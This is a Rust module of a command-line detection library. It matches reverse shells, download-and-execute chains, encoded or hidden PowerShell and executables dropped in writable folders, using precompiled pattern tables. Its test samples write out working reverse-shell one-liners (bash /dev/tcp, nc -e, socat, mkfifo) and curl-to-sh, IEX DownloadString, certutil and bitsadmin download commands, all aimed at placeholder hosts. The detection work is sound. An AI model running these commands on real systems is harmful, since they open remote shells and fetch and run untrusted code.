/// Command line and path patterns, matched with tables built at compile time so no pattern is compiled at run time
use regex_automata::dfa::dense::DFA;
use regex_automata::dfa::Automaton;
use regex_automata::Input;
use std::sync::LazyLock;

type Table = DFA<&'static [u32]>;

#[repr(C)]
struct Aligned<B: ?Sized> {
    _align: [u32; 0],
    bytes: B,
}

include!(concat!(env!("OUT_DIR"), "/tables.rs"));

fn load(tables: &'static [&'static Aligned<[u8]>]) -> Vec<Table> {
    tables.iter().map(|table| DFA::from_bytes(&table.bytes).expect("the table was written by this build").0).collect()
}

static WRITABLE_TABLES: LazyLock<Vec<Table>> = LazyLock::new(|| load(WRITABLE));
static DROPPED_TABLES: LazyLock<Vec<Table>> = LazyLock::new(|| load(DROPPED));
static ENCODED_TABLES: LazyLock<Vec<Table>> = LazyLock::new(|| load(ENCODED));
static HIDDEN_TABLES: LazyLock<Vec<Table>> = LazyLock::new(|| load(HIDDEN));
static REVERSE_TABLES: LazyLock<Vec<Table>> = LazyLock::new(|| load(REVERSE));
static FETCHED_TABLES: LazyLock<Vec<Table>> = LazyLock::new(|| load(FETCHED));
static GATE_TABLES: LazyLock<Vec<Table>> = LazyLock::new(|| load(GATE));

fn found(tables: &[Table], text: &str) -> bool {
    let input = Input::new(text.as_bytes()).earliest(true);
    tables.iter().any(|table| table.try_search_fwd(&input).expect("a byte table never gives up on a search").is_some())
}

/// A user-writable folder
pub fn writable(text: &str) -> bool {
    found(&WRITABLE_TABLES, text)
}

/// A file name that the system would run or load
pub fn dropped(text: &str) -> bool {
    found(&DROPPED_TABLES, text)
}

/// An encoded PowerShell command
pub fn encoded(text: &str) -> bool {
    found(&ENCODED_TABLES, text)
}

/// A window asked to stay hidden
pub fn hidden(text: &str) -> bool {
    found(&HIDDEN_TABLES, text)
}

/// A command line, looked at once for the words the slower patterns need before any of them runs
pub struct Command<'a> {
    text: &'a str,
    gated: bool,
}

impl<'a> Command<'a> {
    pub fn new(text: &'a str) -> Self {
        Command { text, gated: found(&GATE_TABLES, text) }
    }

    /// A shell wired to a socket
    pub fn reverse(&self) -> bool {
        self.gated && found(&REVERSE_TABLES, self.text)
    }

    /// A download piped into execution
    pub fn fetched(&self) -> bool {
        self.gated && found(&FETCHED_TABLES, self.text)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    include!("pattern_list.rs");

    const WHOLE: &[(&str, &str)] = &[
        ("writable", r"(?i)\\users\\public\\|\\appdata\\local\\temp\\|\\windows\\temp\\|\\downloads\\|^/tmp/|\s/tmp/|/dev/shm/|/var/tmp/|/downloads/"),
        ("dropped", r"(?i)\.(dll|exe|sys|scr|ps1|vbs|jse?|bat|cmd|hta|lnk|so|dylib|sh|elf|jar)$"),
        ("encoded", r"(?i)\s-e(c|nc|nco\w*)?\s+[a-z0-9+/=]{8,}|frombase64string"),
        ("hidden", r"(?i)\s-w(in|indowstyle)?\s+h(idden)?\b"),
        ("reverse", r"(?i)/dev/(tcp|udp)/|\bn(c|cat)\b.*\s-e\s|\bbash\s+-i\b|\bsocat\b.*\bexec\b|\bmkfifo\b.*\bn(c|cat)\b"),
        (
            "fetched",
            r"(?i)\b(curl|wget)\b[^|]*\|\s*(ba|z|da)?sh\b|\biex\b|invoke-expression|downloadstring|certutil(\.exe)?\s.*-urlcache|bitsadmin(\.exe)?\s.*/transfer",
        ),
    ];

    fn table(name: &str) -> fn(&str) -> bool {
        match name {
            "writable" => writable,
            "dropped" => dropped,
            "encoded" => encoded,
            "hidden" => hidden,
            "reverse" => |text| Command::new(text).reverse(),
            "fetched" => |text| Command::new(text).fetched(),
            other => panic!("no table named {}", other),
        }
    }

    const SAMPLES: &[&str] = &[
        "",
        "/tmp/.x/kworker",
        "sh -c /tmp/run.sh",
        "cat /var/log/tmp/file",
        "C:\\Users\\Public\\update.dll,Start",
        "C:\\USERS\\PUBLIC\\a.exe",
        "/home/dev/Downloads/setup.sh",
        "/dev/shm/payload",
        "/usr/lib/libjemalloc.so",
        "/usr/lib/libjemalloc.so.2",
        "report.JAR",
        "notes.shx",
        "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "powershell -EncodedCommand AAAAAAAAAAAA",
        "pwsh -e short",
        "[Convert]::FromBase64String($x)",
        "cmd /c start -windowstyle hidden x",
        "tool -w high",
        "tool -w h",
        "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
        "bash -ic id",
        "nc 203.0.113.9 4444 -e /bin/sh",
        "ncat -l -p 80 -e cmd",
        "sync -e x",
        "socat TCP:203.0.113.9:443 EXEC:/bin/sh",
        "mkfifo /tmp/f; cat /tmp/f | nc 203.0.113.9 1 > /tmp/f",
        "curl -s http://203.0.113.9/a | sh",
        "curl -o /tmp/report.csv https://example.com/report.csv",
        "wget -qO- https://example.com/i|bash",
        "curl https://example.com | shasum",
        "echo a | curl https://example.com | zsh",
        "IEX (New-Object Net.WebClient).DownloadString('http://x')",
        "piex",
        "Invoke-Expression $x",
        "certutil.exe -urlcache -split -f http://x y",
        "certutil -hashfile x",
        "bitsadmin /transfer job http://x y",
        "line one\nnc host -e sh",
        "nc host\n -e sh",
        "caf\u{e9} /tmp/x",
        "\u{212a}ERNEL -w hidden",
    ];

    #[test]
    fn test_every_table_matches_exactly_what_its_pattern_matches() {
        let mut state = 0x9e3779b97f4a7c15u64;
        let mut next = move || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };
        let alphabet: Vec<&str> = vec![
            " ",
            "-",
            "e",
            "w",
            "h",
            "i",
            "|",
            "/",
            "\\",
            ".",
            "sh",
            "nc",
            "ncat",
            "bash",
            "curl",
            "wget",
            "tmp",
            "dev",
            "tcp",
            "exec",
            "socat",
            "mkfifo",
            "enc",
            "hidden",
            "iex",
            "exe",
            "dll",
            "\n",
            "A",
            "b",
            "0",
            "=",
            "+",
            "certutil",
            "-urlcache",
            "downloads",
            "users",
            "public",
            "\t",
            "\u{e9}",
        ];
        let mut samples: Vec<String> = SAMPLES.iter().map(|sample| sample.to_string()).collect();
        for _ in 0..20_000 {
            let parts = 1 + next() % 12;
            samples.push((0..parts).map(|_| alphabet[(next() % alphabet.len() as u64) as usize]).collect());
        }

        assert_eq!(
            PATTERNS.iter().map(|(name, _)| *name).filter(|name| *name != "gate").collect::<Vec<_>>(),
            WHOLE.iter().map(|(name, _)| *name).collect::<Vec<_>>()
        );
        for (name, pattern) in WHOLE {
            let reference = regex::bytes::RegexBuilder::new(pattern).unicode(false).build().unwrap();
            let matches = table(name);
            let mut hits = 0;
            for sample in &samples {
                let expected = reference.is_match(sample.as_bytes());
                assert_eq!(matches(sample), expected, "{} on {:?}", name, sample);
                hits += usize::from(expected);
            }
            assert!(hits > 0 && hits < samples.len(), "{} must both match and miss in the samples, matched {}", name, hits);
        }
    }
}
